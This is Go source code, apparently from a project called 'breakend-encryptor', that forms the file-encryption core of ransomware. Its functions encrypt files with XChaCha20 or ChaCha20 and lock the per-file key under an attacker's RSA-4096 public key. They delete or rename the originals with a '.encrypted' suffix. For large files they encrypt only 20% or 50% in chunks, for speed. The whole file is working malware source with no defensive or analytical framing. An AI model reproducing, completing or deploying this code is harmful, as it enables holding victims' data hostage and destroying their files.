package chacha20

import (
	"crypto/rand"
	"fmt"
	"io"
	"os"

	rsa4096 "breakend-encryptor/internal/rsa4096"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/chacha20poly1305"
)

func EncryptFileT1(filePath string, key []byte, pubRsaKeyBytes []byte) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return err
	}

	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := aead.Seal(nil, nonce, data, nil)

	// Encrypth key using RSA4096
	encryptedKey, err := rsa4096.EncryptWithRSA4096(key, pubRsaKeyBytes)
	if err != nil {
		return err
	}
	// 512 bytes
	key = encryptedKey
	// Append the nonce, ciphertext, key, and original file size together
	keyNonceSize := append(key, nonce...)
	fileSize := []byte(fmt.Sprintf("%010d", len(data)))
	encryptedData := append(ciphertext, keyNonceSize...)
	encryptedData = append(encryptedData, fileSize...)

	// DEBUG
	// fmt.Printf("Key: %x\n", key)
	// fmt.Printf("Nonce: %x\n", nonce)
	// fmt.Printf("Data Size: %x\n", len(data))

	// fmt.Println("Data: ", len(data))

	// Write everything to a new file with the same name but with ".encrypted" appended
	err = os.WriteFile(filePath+".encrypted", encryptedData, 0644)
	if err != nil {
		return err
	}

	// Remove the original file
	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

func EncryptFileT2(filePath string, key []byte, pubRsaKeyBytes []byte) error {

	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return err
	}

	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	// Encrypt the first 1MB
	ciphertext := aead.Seal(nil, nonce, data[:1000000], nil)

	// Append original data
	encryptedData := append(ciphertext, data[1000000:]...)

	// Encrypth key using RSA4096
	encryptedKey, err := rsa4096.EncryptWithRSA4096(key, pubRsaKeyBytes)
	if err != nil {
		return err
	}
	key = encryptedKey

	// recontruct file using format: EncryptedData + UnencryptedData + Key + Nonce + DataSize
	keyNonceSize := append(key, nonce...)
	fileSize := []byte(fmt.Sprintf("%010d", len(data)))
	encryptedData = append(encryptedData, keyNonceSize...)
	encryptedData = append(encryptedData, fileSize...)

	// Write everything to a new file with the same name but with ".encrypted" appended
	err = os.WriteFile(filePath+".encrypted", encryptedData, 0644)
	if err != nil {
		return err
	}

	// Remove the original file
	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

func EncryptLargeFile(filePath string, dataPercent int, key []byte, pubRsaKeyBytes []byte) error {
	// Open file
	file, err := os.OpenFile(filePath, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer file.Close()

	// Get file size
	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}
	fileSize := fileInfo.Size()

	// Calculate part size, step size, and steps count based on dataPercent
	var partSize, stepSize int64
	var stepsCount int
	switch dataPercent {
	case 20:
		partSize = (fileSize / 100) * 7
		stepsCount = 3
		stepSize = (fileSize - (partSize * 3)) / 2
	case 50:
		partSize = (fileSize / 100) * 10
		stepsCount = 5
		stepSize = partSize
	default:
		return fmt.Errorf("invalid dataPercent")
	}

	// Generate a random nonce
	nonce := make([]byte, chacha20.NonceSize)
	if _, err := rand.Read(nonce); err != nil {
		return err
	}

	// Create a new cipher
	c, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return err
	}
	// DEBUG
	//fmt.Printf("Key: %x\n", key)
	//fmt.Printf("Nonce: %x\n", nonce)

	// Create a buffer to read data into
	buffer := make([]byte, 4096)

	// Encrypt the file partly
	for i := 0; i < stepsCount; i++ {
		totalRead := int64(0)
		bytesToEncrypt := partSize

		if i != 0 {
			// skip stepSize bytes
			if _, err := file.Seek(stepSize, io.SeekCurrent); err != nil {
				return err
			}
		}

		for totalRead < bytesToEncrypt {
			// Read data from the file
			bytesRead, err := file.Read(buffer)
			if err != nil && err != io.EOF {
				return err
			}
			if bytesRead == 0 {
				break
			}

			// Encrypt the data
			c.XORKeyStream(buffer[:bytesRead], buffer[:bytesRead])

			// Write the encrypted data back to the file
			if _, err := file.Seek(-int64(bytesRead), io.SeekCurrent); err != nil {
				return err
			}
			if _, err := file.Write(buffer[:bytesRead]); err != nil {
				return err
			}

			totalRead += int64(bytesRead)
		}
	}

	// pointer to the end of the file
	if _, err := file.Seek(0, io.SeekEnd); err != nil {
		return err
	}
	// Encrypth key using RSA4096
	encryptedKey, err := rsa4096.EncryptWithRSA4096(key, pubRsaKeyBytes)
	if err != nil {
		return err
	}
	key = encryptedKey

	// wite key and nonce to the end
	if _, err := file.Write(key); err != nil {
		return err
	}
	if _, err := file.Write(nonce); err != nil {
		return err
	}

	file.Close()
	// rename file adding .encrypted
	err = os.Rename(filePath, filePath+".encrypted")
	if err != nil {
		return err
	}

	return nil
}
